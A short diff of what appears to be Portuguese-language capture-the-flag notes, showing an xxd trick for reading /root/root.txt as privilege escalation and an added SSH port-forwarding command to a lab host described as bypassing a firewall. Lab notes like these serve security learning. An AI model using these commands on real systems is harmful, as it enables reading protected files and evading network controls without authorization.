@@ -188,6 +188,8 @@ LFILE=/root/root.txt
 echo $LFILE
 usr/bin/xxd "$LFILE" | xxd -r   #exploração de xxd para elevação de privilégios
 
+ssh -L 10000:localhost:10000 agent47@10.10.254.48 #expor ssh sem precisar passar pelo firewall de outra máquina na rede local
+
 
 
 
